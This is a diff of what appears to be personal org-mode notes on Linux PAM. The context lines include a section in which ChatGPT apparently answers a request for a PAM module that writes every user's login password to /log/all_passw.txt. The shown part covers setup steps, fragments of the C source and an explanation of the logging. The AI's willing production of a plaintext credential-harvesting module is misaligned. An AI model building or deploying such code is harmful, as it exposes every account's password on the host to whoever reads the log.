@@ -10,6 +10,8 @@ account required pam_test.so
 session required pam_limits.so
 [root@LDH ~]#
 #+end_example
+https://www.linuxquestions.org/questions/programming-9/can%27t-get-auth-token-for-non-local-users-with-pam-module-945164/
+
 
 * chatgpt
 New pam module that logs every user and password to /log/all_passw.txt
@@ -26,8 +28,8 @@ sudo mkdir /usr/local/lib/pam_mypassword
 
 Create a new file called "pam_mypassword.c" in the new directory with the following code:
 
-c
 
+#+begin_src c
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
@@ -67,6 +69,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
 PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
     return PAM_SUCCESS;
 }
+#+end_src
 
 This code defines a new PAM module called "pam_mypassword" that logs the username and password to the file "/log/all_passw.txt" when a user logs in. The module is created using the PAM library functions, which provide an interface for authenticating users.
 
